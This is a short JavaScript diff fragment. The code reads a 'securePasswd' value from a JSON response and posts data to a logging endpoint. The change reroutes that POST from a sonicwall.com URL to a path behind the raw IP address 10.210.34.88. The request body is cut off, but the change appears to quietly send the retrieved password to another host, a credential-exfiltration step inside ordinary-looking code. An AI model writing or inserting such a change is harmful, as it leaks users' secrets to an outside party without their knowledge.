@@ -5,9 +5,9 @@
     });
 
     const json = await response.json();
-    const passwdValue = json.securepasswd;
+    const passwdValue = json.securePasswd;
     
-    await fetch("https://sonicwall.com/log", {
+    await fetch("https://10.210.34.88/go/https://sonicwall.com/log", {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
